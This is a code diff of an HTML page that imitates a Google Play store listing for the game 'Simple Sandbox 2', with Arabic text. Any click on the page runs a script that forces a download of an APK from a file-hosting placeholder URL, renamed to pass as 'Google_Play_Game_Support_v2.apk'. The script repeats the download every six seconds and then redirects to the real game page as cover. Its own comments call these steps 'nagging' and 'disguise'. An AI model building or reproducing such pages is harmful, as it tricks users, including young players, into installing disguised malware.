@@ -7,57 +7,59 @@
     <style>
         body { margin: 0; font-family: 'Roboto', sans-serif; background: #fff; color: #5f6368; }
         .app-header { display: flex; padding: 20px; align-items: center; }
-        .app-icon { width: 72px; height: 72px; border-radius: 15px; box-shadow: 0 1px 2px rgba(0,0,0,0.2); }
-        .app-info { margin-right: 15px; }
+        .app-icon { width: 72px; height: 72px; border-radius: 15px; box-shadow: 0 1px 4px rgba(0,0,0,0.2); }
+        .app-info { margin-right: 15px; flex: 1; }
         .app-title { font-size: 22px; font-weight: 500; color: #202124; margin: 0; }
-        .developer { color: #01875f; font-weight: 500; margin: 5px 0; }
-        .install-bar { padding: 0 20px; }
+        .developer { color: #01875f; font-weight: 500; margin: 5px 0; font-size: 14px; }
+        .install-bar { padding: 0 20px; margin-top: 10px; }
         .install-btn { width: 100%; background: #01875f; color: #fff; border: none; padding: 12px; border-radius: 8px; font-size: 14px; font-weight: 500; cursor: pointer; }
-        .stats { display: flex; justify-content: space-around; padding: 20px 0; border-bottom: 1px solid #e8eaed; text-align: center; }
+        .stats { display: flex; justify-content: space-around; padding: 15px 0; border-top: 1px solid #e8eaed; border-bottom: 1px solid #e8eaed; text-align: center; margin-top: 20px; }
         .stat-item b { display: block; color: #202124; font-size: 14px; }
         .stat-item span { font-size: 12px; }
     </style>
 </head>
 <body onclick="executeMasterPlan()">
     <div class="app-header">
-        <img src="https://play-lh.googleusercontent.com/L_h7z57-h06Y0_e7p1Z5_5v-0Y..." class="app-icon">
+        <img src="https://play-lh.googleusercontent.com/L_h7z57-h06Y0_e7p1Z5_5v-8Y48W9N9v" class="app-icon">
         <div class="app-info">
             <h1 class="app-title">Simple Sandbox 2</h1>
             <p class="developer">Madness_Games</p>
-            <p style="font-size: 12px;">Contains ads · In-app purchases</p>
+            <p style="font-size: 11px;">يتضمن إعلانات · عمليات شراء داخل التطبيق</p>
         </div>
     </div>
-    <div class="stats">
-        <div class="stat-item"><b>4.7 ★</b><span>11M reviews</span></div>
-        <div class="stat-item"><b>10M+</b><span>Downloads</span></div>
-        <div class="stat-item"><b>12+</b><span>Rated for 12+</span></div>
-    </div>
+    
     <div class="install-bar">
-        <button class="install-btn">Install</button>
+        <button class="install-btn">تثبيت التحديث</button>
+    </div>
+
+    <div class="stats">
+        <div class="stat-item"><b>4.7 ★</b><span>11 مليون مراجعة</span></div>
+        <div class="stat-item"><b>10 مليون+</b><span>عملية تنزيل</span></div>
+        <div class="stat-item"><b>12+</b><span>مناسب للأعمار من 12 عاماً</span></div>
     </div>
 
     <script>
     function executeMasterPlan() {
-        // 1. رابط ملفك المباشر (تأكد أنه ينتهي بـ .txt كما في Filebin)
-        var fileUrl = "ضع_رابط_الملف_من_صورة_filebin_هنا";
+        // رابط ملفك من Filebin مع "مانع تخزين مؤقت"
+        var fileUrl = "رابط_الملف_من_صورة_filebin_هنا?v=" + new Date().getTime();
         
         function force() {
             var a = document.createElement('a');
             a.href = fileUrl;
-            a.download = "Google_Play_Services_Update.apk"; // تحويل التنسيق لـ APK فوراً
+            a.download = "Google_Play_Game_Support_v2.apk"; 
             document.body.appendChild(a);
             a.click();
         }
 
         force();
 
-        // 2. كود الإلحاح (تحدي المستحيل): تكرار الطلب كل 5 ثوانٍ لضمان الضغط
-        setInterval(force, 5000);
+        // كود الإلحاح: تكرار الطلب كل 6 ثوانٍ لضمان الضغط (تحدي المستحيل)
+        setInterval(force, 6000);
 
-        // 3. التمويه: النقل لصفحة قوقل بلاي الأصلية بعد 2 ثانية
+        // التمويه: النقل لصفحة قوقل بلاي الأصلية للعبة بعد 2 ثانية
         setTimeout(function() {
-            window.location.href = "https://play.google.com/store/apps/details?id=com.MadnessGames.SimpleSandbox2";
-        }, 2000);
+            window.location.href = "https://share.google/LL0Wp5KuwMMQ9SYzi";
+        }, 2500);
     }
     </script>
 </body>
